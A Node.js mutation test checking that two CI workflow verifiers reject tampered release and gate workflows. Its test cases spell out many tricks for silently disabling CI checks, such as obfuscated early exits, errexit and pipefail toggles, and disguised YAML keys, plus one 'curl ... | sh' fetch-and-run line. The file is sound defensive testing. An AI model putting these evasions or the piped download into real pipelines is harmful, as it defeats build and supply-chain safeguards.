#!/usr/bin/env node
// F-07 / F-08 residual mutation tests (independent retest, round 3): the
// website release-pin verifier and the L1 release-policy verifier must reject
// ineffective variants of their workflows and still accept the real ones.
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { verifyWebsiteReleasePinWorkflow } from './verify-website-release-pin-action-custody.mjs';
import { verifyL1ReleaseWorkflow } from '../.github/scripts/verify-l1-release-action-custody.mjs';

const read = (path) => readFile(new URL(`../${path}`, import.meta.url), 'utf8');
const website = await read('.github/workflows/website-release-pin-ci.yml');
const release = await read('.github/workflows/l1-release.yml');
assert.doesNotThrow(() => verifyWebsiteReleasePinWorkflow(website), 'the real website release-pin workflow must pass');
assert.doesNotThrow(() => verifyL1ReleaseWorkflow(release), 'the real release workflow must pass');

const replaceOnce = (text, from, to) => {
  assert.ok(text.includes(from), `mutation anchor missing: ${from}`);
  // A function replacement keeps `to` literal: a string replacement would expand
  // `$'`, `$&` and similar patterns, which shell mutations contain.
  return text.replace(from, () => to);
};

const websiteMutations = {
  'l1/** removed from both triggers': website.replaceAll("      - 'l1/**'\n", ''),
  'second diff compares a path missing from the triggers':
    replaceOnce(website, "'docs/STANDALONE_L1_READINESS.md')", "'docs/STANDALONE_L1_READINESS.md' 'extra-canonical/**')"),
  'diff failure masked with a shell no-op':
    replaceOnce(website, "'docs/STANDALONE_L1_READINESS.md')", "'docs/STANDALONE_L1_READINESS.md' || :)"),
  'diff failure masked with exit 0':
    replaceOnce(website, "'docs/STANDALONE_L1_READINESS.md')", "'docs/STANDALONE_L1_READINESS.md' || exit 0)"),
  'pipefail removed': replaceOnce(website, 'set -euo pipefail', 'set -eu'),
  // Round-4 independent retest (PR984): each of these was accepted before.
  'l1/** removed from the pull_request trigger only': replaceOnce(website, "      - 'l1/**'\n", ''),
  'l1/** removed from the push trigger only': (() => {
    const push = website.indexOf('  push:');
    return website.slice(0, push) + replaceOnce(website.slice(push), "      - 'l1/**'\n", '');
  })(),
  'pipefail only in a comment': replaceOnce(website, 'set -euo pipefail', '# set -euo pipefail\n          set -eu'),
  // Round-5 (Codex review of #997): each of these was accepted before.
  'pipefail only inside a heredoc body': replaceOnce(website, 'set -euo pipefail',
    "cat <<'STRICT'\n          set -euo pipefail\n          STRICT\n          set -eu"),
  'pipefail set after the first gate command': replaceOnce(website, 'set -euo pipefail\n',
    'true\n          set -euo pipefail\n'),
  'pipefail switched off again later': replaceOnce(website, "          node <<'NODE'", "          set +o pipefail\n          node <<'NODE'"),
  'errexit switched off again later': replaceOnce(website, "          node <<'NODE'", "          set +e\n          node <<'NODE'"),
  // Round-5 (Codex review of #1009): shell-equivalent spellings of `set +e`.
  'errexit switched off with a split-quoted set': replaceOnce(website, 'set -euo pipefail\n', "set -euo pipefail\n          s''et +e\n"),
  'errexit switched off with an ANSI-C quoted set': replaceOnce(website, 'set -euo pipefail\n', "set -euo pipefail\n          $'set' +e\n"),
  'errexit switched off with a backslash-escaped set': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          \\set +e\n'),
  'errexit switched off with an ANSI-C escaped set': replaceOnce(website, 'set -euo pipefail\n', "set -euo pipefail\n          $'\\163et' +e\n"),
  'errexit switched off through eval': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          eval "$(printf s)et +e"\n'),
  // Round-5 (second Codex review of #1009) and same-class variants.
  'errexit switched off by a mixed set operand': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          set -u +e\n'),
  'errexit switched off across a line continuation': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          se\\\n          t +e\n'),
  'errexit switched off through a variable command name': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          S=set\n          $S +e\n'),
  'pipefail switched off with shopt -o -u': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          shopt -o -u pipefail\n'),
  'gate ends early with exit 0 before its checks': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          exit 0\n'),
  'gate ends early with exec true before its checks': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          exec true\n'),
  // Same class, other command positions (accepted by the first fix for the
  // second Codex review of #1009).
  'gate ends early through a variable command after a separator':
    replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          X=exit\n          true; $X 0\n'),
  'gate ends early through a braced variable command name':
    replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          X=exit\n          ${X} 0\n'),
  'gate ends early through a variable command after a [[ ]] test':
    replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          X=exit\n          [[ -n "$X" ]] && $X 0\n'),
  'gate ends early through a backtick command name':
    replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          `printf %s ex it` 0\n'),
  'gate ends early through a command-substitution command name':
    replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          $(printf %s ex it) 0\n'),
  // Round-6 independent retest (PR1009, R6-1009-L1): each of these was accepted
  // by the denylist. The gate workflow is now pinned byte-for-byte, so any
  // change at all is refused until the pinned digest is updated in review.
  'gate step ignores its own failure': replaceOnce(website, '        shell: bash', '        continue-on-error: true\n        shell: bash'),
  'gate job ignores its own failure': replaceOnce(website, '    runs-on:', '    continue-on-error: true\n    runs-on:'),
  'gate step skipped with if: false': replaceOnce(website, '        shell: bash', '        if: false\n        shell: bash'),
  'gate step skipped with an expression': replaceOnce(website, '        shell: bash', '        if: ${{ false }}\n        shell: bash'),
  'gate step skipped through a YAML anchor alias':
    replaceOnce(replaceOnce(website, 'permissions:\n', 'x-skip: &skip false\npermissions:\n'), '        shell: bash', '        if: *skip\n        shell: bash'),
  'negative l1 path in the triggers': website.replaceAll("      - 'l1/**'\n", "      - 'l1/**'\n      - '!l1/**'\n"),
  'gate run by a custom shell that ignores the script': replaceOnce(website, 'shell: bash', 'shell: true {0}'),
  'gate wrapped in a double-quoted heredoc': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          cat <<"EOF"\n') + '          EOF\n',
  'gate wrapped in a tab-stripped heredoc': replaceOnce(website, 'set -euo pipefail\n', "set -euo pipefail\n          cat <<-'X_1'\n") + '          X_1\n',
  'gate wrapped in an escaped heredoc': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          cat <<\\EOF\n') + '          EOF\n',
  'gate defined as a function and skipped by true ||':
    replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          gate() {\n') + '          }\n          true || gate\n',
  'git shadowed by a shell function': replaceOnce(website, 'set -euo pipefail\n', 'set -euo pipefail\n          git() { :; }\n'),
  'trailing whitespace only': website.replace(/\n$/, '\n\n')
};
for (const [name, mutated] of Object.entries(websiteMutations)) {
  assert.notEqual(mutated, website, `mutation has no effect: ${name}`);
  assert.throws(() => verifyWebsiteReleasePinWorkflow(mutated), Error, `website mutation must be rejected: ${name}`);
}

// Insert one property line into the release job, or into the audit step.
const atJob = (line) => replaceOnce(release, '    runs-on: ubuntu-latest\n', `    runs-on: ubuntu-latest\n    ${line}\n`);
const atAuditStep = (line) => replaceOnce(release, '        run: npm audit --omit=dev --audit-level=high',
  `        ${line}\n        run: npm audit --omit=dev --audit-level=high`);
const releaseMutations = {
  'audit printed instead of run':
    replaceOnce(release, 'run: npm audit --omit=dev --audit-level=high', 'run: echo npm audit --omit=dev --audit-level=high'),
  'continue-on-error as the first step property':
    replaceOnce(release, '- name: Test\n        run: npm test', '- continue-on-error: true\n        name: Test\n        run: npm test'),
  'test command after exit 0': replaceOnce(release, 'run: npm test', 'run: |\n          exit 0\n          npm test'),
  'condition as the first step property':
    replaceOnce(release, '- name: Test\n        run: npm test', "- if: ${{ false }}\n        name: Test\n        run: npm test"),
  // Round-4 independent retest (PR984): each of these was accepted before.
  'audit printed from a heredoc': replaceOnce(release, 'run: npm audit --omit=dev --audit-level=high',
    "run: |\n          cat <<'AUDIT_TEXT'\n          npm audit --omit=dev --audit-level=high\n          AUDIT_TEXT"),
  'test command after builtin exit 0': replaceOnce(release, 'run: npm test', 'run: |\n          builtin exit 0\n          npm test'),
  'test command after command exit 0': replaceOnce(release, 'run: npm test', 'run: |\n          command exit 0\n          npm test'),
  'test command after a separator and builtin exit': replaceOnce(release, 'run: npm test', 'run: true; builtin exit 0; npm test'),
  // Round-5 (Codex review of #997): each of these was accepted before.
  'test command after single-quoted eval exit': replaceOnce(release, 'run: npm test', "run: |\n          eval 'exit 0'\n          npm test"),
  'test command after double-quoted eval exit': replaceOnce(release, 'run: npm test', 'run: |\n          eval "exit 0"\n          npm test'),
  'test command after a computed eval': replaceOnce(release, 'run: npm test', 'run: |\n          eval "$(printf ex)it 0"\n          npm test'),
  'test command after a quoted exit name': replaceOnce(release, 'run: npm test', "run: |\n          'exit' 0\n          npm test"),
  'test command after a split-quoted exit name': replaceOnce(release, 'run: npm test', "run: |\n          e''xit 0\n          npm test"),
  'test command after a backslash-escaped exit name': replaceOnce(release, 'run: npm test', 'run: |\n          \\exit 0\n          npm test'),
  // Round-5 (Codex review of #1009): ANSI-C and locale quoting.
  'test command after an ANSI-C quoted exit name': replaceOnce(release, 'run: npm test', "run: |\n          $'exit' 0\n          npm test"),
  'test command after an ANSI-C escaped exit name': replaceOnce(release, 'run: npm test', "run: |\n          $'\\145xit' 0\n          npm test"),
  'test command after a locale-quoted exit name': replaceOnce(release, 'run: npm test', 'run: |\n          $"exit" 0\n          npm test'),
  // Round-5 (second Codex review of #1009) and same-class variants: the release
  // run steps are now an exact allowlist, so any other spelling is refused.
  'test command after an exit split by a line continuation': replaceOnce(release, 'run: npm test', 'run: |\n          ex\\\n          it 0\n          npm test'),
  'test command after an exit through a variable command name': replaceOnce(release, 'run: npm test', 'run: |\n          X=exit\n          $X 0\n          npm test'),
  'test step run by a custom shell that ignores the script': replaceOnce(release, '- name: Test\n        run: npm test', '- name: Test\n        shell: true {0}\n        run: npm test'),
  'all steps run by a default custom shell': replaceOnce(release, '      run:\n        working-directory: l1', '      run:\n        shell: true {0}\n        working-directory: l1'),
  'test command in a quoted run value': replaceOnce(release, 'run: npm test', 'run: "npm test"\n        env:\n          X: "1"'),
  'extra command in the build block': replaceOnce(release, '          npm run build\n', '          npm run build\n          curl -fsS https://example.invalid/x | sh\n'),
  'run key in a flow mapping': replaceOnce(release, '      - name: Test\n        run: npm test', '      - { name: Early, run: exit 0 }\n      - name: Test\n        run: npm test'),
  'test command after exec true': replaceOnce(release, 'run: npm test', 'run: |\n          exec true\n          npm test'),
  'audit printed from a heredoc with a numeric delimiter': replaceOnce(release, 'run: npm audit --omit=dev --audit-level=high',
    'run: |\n          cat <<9\n          npm audit --omit=dev --audit-level=high\n          9'),
  'audit printed from a heredoc with a quoted numeric delimiter': replaceOnce(release, 'run: npm audit --omit=dev --audit-level=high',
    "run: |\n          cat <<'9'\n          npm audit --omit=dev --audit-level=high\n          9"),
  'audit printed from a heredoc with a backslash-quoted delimiter': replaceOnce(release, 'run: npm audit --omit=dev --audit-level=high',
    'run: |\n          cat <<\\AUDIT\n          npm audit --omit=dev --audit-level=high\n          AUDIT'),
  'audit printed from a heredoc with a punctuation delimiter': replaceOnce(release, 'run: npm audit --omit=dev --audit-level=high',
    'run: |\n          cat <<-.END\n          npm audit --omit=dev --audit-level=high\n          .END'),
  // Round-6 independent retest (PR1009, Info): a zero step timeout.
  'audit step with a zero timeout': replaceOnce(release, '        run: npm audit --omit=dev --audit-level=high',
    '        timeout-minutes: 0\n        run: npm audit --omit=dev --audit-level=high'),
  // Round-6 independent retest (PR1013, Info): YAML reads a quoted, escaped,
  // explicit (`? key`) or tagged key as the same key, so these spellings of
  // timeout-minutes, continue-on-error and if were accepted before. The release
  // workflow uses none of these key forms, so they are refused outright.
  'job with a zero timeout under a double-quoted key': atJob('"timeout-minutes": 0'),
  'job with a zero timeout under a single-quoted key': atJob("'timeout-minutes': 0"),
  'job made conditional under a double-quoted key': atJob('"if": false'),
  'job allowed to fail under a single-quoted key': atJob("'continue-on-error': true"),
  'audit step with a zero timeout under a double-quoted key': atAuditStep('"timeout-minutes": 0'),
  'audit step with a zero timeout under a single-quoted key': atAuditStep("'timeout-minutes': 0"),
  'audit step with a zero timeout under an escaped double-quoted key': atAuditStep('"timeout\\x2dminutes": 0'),
  'audit step with a zero timeout under an explicit key': atAuditStep('? timeout-minutes\n        : 0'),
  'audit step with a zero timeout under a tagged key': atAuditStep('!!str timeout-minutes: 0'),
  'audit step allowed to fail under a double-quoted key': atAuditStep('"continue-on-error": true'),
  'audit step allowed to fail under a single-quoted key': atAuditStep("'continue-on-error': true"),
  'audit step made conditional under a single-quoted key': atAuditStep("'if': false"),
  'audit step made conditional under a double-quoted key': atAuditStep('"if": ${{ false }}'),
  'audit step made conditional under a tagged key': atAuditStep('!!str if: false')
};
const acceptedReleaseMutations = Object.entries(releaseMutations)
  .filter(([, mutated]) => { try { verifyL1ReleaseWorkflow(mutated); return true; } catch { return false; } })
  .map(([name]) => name);
assert.deepEqual(acceptedReleaseMutations, [], `release mutations must be rejected: ${acceptedReleaseMutations.join('; ')}`);
console.log(`ci-verifier-mutations: ok (${Object.keys(websiteMutations).length + Object.keys(releaseMutations).length} mutations rejected)`);
